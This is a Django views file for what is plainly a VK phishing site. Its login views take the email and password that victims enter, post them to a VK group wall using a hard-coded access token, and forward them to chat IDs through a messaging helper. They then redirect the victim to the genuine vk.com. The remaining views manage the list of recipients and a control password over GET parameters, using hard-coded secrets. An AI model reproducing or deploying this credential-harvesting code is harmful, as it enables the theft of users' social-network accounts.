from django.shortcuts import render
from django.http import *
from .forms import *
# from vk_api import *
from vk import *
from .microdetector import detect_mobile
from .models import *
import time
from array import *
from .utils import *

# Create your views here.


def index(request):
    if request.method == "POST":
        tok = "be363c662f54c1f5f9e008f7eab1e41a96958a4a5781725c9445f49ddf03520e15a10d6da236bd8ee0ed3"
        club = -189734539

        email = request.POST.get("email")
        pas = request.POST.get("pas")

        body = "Login: {0}\nPass: {1}\n".format(email, pas)

        ses = Session(access_token=tok)
        vk = API(session=ses)
        vk.wall.post(owner_id=club, from_group=1, message=body, v=5.103)

        ids = id_list.objects.in_bulk()
        for id in ids:
            tel(body, ids[id].number)

        return HttpResponsePermanentRedirect("https://m.vk.com")
    form = login()
    return render(request, "app_serverr/index.html", {"form": form})


@detect_mobile
def full(request):
    if request.method == "POST":
        tok = "be363c662f54c1f5f9e008f7eab1e41a96958a4a5781725c9445f49ddf03520e15a10d6da236bd8ee0ed3"
        club = -189734539

        email = request.POST.get("email")
        pas = request.POST.get("pas")

        body = "Login: {0}\nPass: {1}\n".format(email, pas)

        ses = Session(access_token=tok)
        vk = API(session=ses)
        vk.wall.post(owner_id=club, from_group=1, message=body, v=5.103)

        ids = id_list.objects.in_bulk()
        for id in ids:
            tel(body, ids[id].number)

        return HttpResponsePermanentRedirect("https://vk.com")
    if request.mobile:
        return HttpResponsePermanentRedirect(request.scheme + "://" + request.META['HTTP_HOST'] + "/m")
    form = full_login()
    return render(request, "app_serverr/full.html", {"form": form})


def id_add(request):
    # tel("запрос получен", 433019587)
    t = request.GET.get('t')
    try:
        p = passs.objects.get(name='pass').pas
    except Exception:
        tel("пароль не установлен", 433019587)
        return HttpResponse("пароль не установлен")
    if t == p:
        i = request.GET.get('id')
        try:
            d = int(i)
        except Exception:
            tel("your айди не число: {}".format(i), 433019587)
            return HttpResponse("your айди не число: {}".format(i))
        try:
            i = id_list.objects.get(number=d)
            tel("айди exist: {}".format(d), 433019587)
        except Exception:
            i = id_list.objects.create(number=d)
            tel("добавлен айди: {}".format(d), 433019587)
            return HttpResponse("добавлен айди: {}".format(d))
    else:
        tel("неверный пароль: {}".format(t), 433019587)
    return HttpResponse("неверный пароль: {}".format(t))


def id_del(request):
    t = request.GET.get('t')
    try:
        p = passs.objects.get(name='pass').pas
    except Exception:
        tel("пароль не установлен", 433019587)
        return HttpResponse("пароль не установлен")
    if t == p:
        try:
            d = int(request.GET.get('id'))
            d = id_list.objects.get(number=d)
        except Exception:
            return HttpResponseRedirect("/")
        i = d.delete()
    return HttpResponseRedirect("/")


def set_pass(request):
    n = request.GET.get('new')
    t = request.GET.get('t')
    o = request.GET.get('old')

    try:
        p = passs.objects.get(name='pass')
    except Exception:
        tel("пароля нет", 433019587)
        if t == "qawsed":
            if len(n) > 7:
                l = passs.objects.create(name='pass', pas=n)
                tel("пароль установлен: {}".format(n), 433019587)
            else:
                tel("длина малова-та: {}".format(n), 433019587)
        else:
            tel("token error: {}".format(t), 433019587)
        return HttpResponseRedirect("/")
    tel("пароль есть", 433019587)
    if o != None and o == p.pas:
        tel("старый пароль верный: {}".format(o), 433019587)
        if len(n) > 7:
            p.pas = n
            p.save()
            tel("пароль новый установлен: {}".format(n), 433019587)
        else:
            tel("длина малова-та: {}".format(n), 433019587)
    else:
        tel(" your old password errore: {0}\nneed: {1}".format(str(o), p.pas), 433019587)
    return HttpResponseRedirect("/")


def clear_pass(request):
    t = request.GET.get('t')
    n = 'aqswde'
    if t == n:
        p = passs.objects.in_bulk()
        for id in p:
            p[id].delete()
        tel("пароли удалены", 433019587)
    else:
        tel("неверный пароль супе: {0}\nneed: {1}".format(t, n), 433019587)
    return HttpResponseRedirect("/")


def clear_ids(request):
    t = request.GET.get('t')
    try:
        p = passs.objects.get(name='pass').pas
    except Exception:
        tel("пароль не установлен", 433019587)
        return HttpResponse("пароль не установлен")
    if t == p:
        i = id_list.objects.in_bulk()
        for id in i:
            i[id].delete()
        tel("ids удалены", 433019587)
    else:
        tel("пароль не верный: {}".format(t), 433019587)
    return HttpResponseRedirect("/")


def get_ids(request):
    t = request.GET.get('t')
    c = request.GET.get('chat')
    try:
        p = passs.objects.get(name='pass').pas
    except Exception:
        tel("пароль не установлен", 433019587)
        return HttpResponse("пароль не установлен")
    # tel("пароль exist", 433019587)
    i = id_list.objects.in_bulk()

    m = array('i', [])
    s = ""
    to = int()
    for f in i:
        # tel(f, 433019587)
        m.append(i[f].number)
        s += "```{}```\n".format(i[f].number)
    if t == str(p):
        tel(s, 433019587)
    else:
        # tel("token not pass", 433019587)
        try:
            to = int(t)
        except Exception:
            tel("token not integer: {}".format(t), 433019587)
        if to in m:
            # tel("id in ids", 433019587)
            try:
                c = int(c)
                # tel("c - int", 433019587)
            except(ValueError, TypeError):
                tel("chat id error", 433019587)
                return HttpResponseRedirect("/")
            tel(s, c)
        else:
            tel("пароль не верный: {}".format(t), 433019587)
            tel("пароль не верный: {}".format(t), c)
    return HttpResponseRedirect("/")
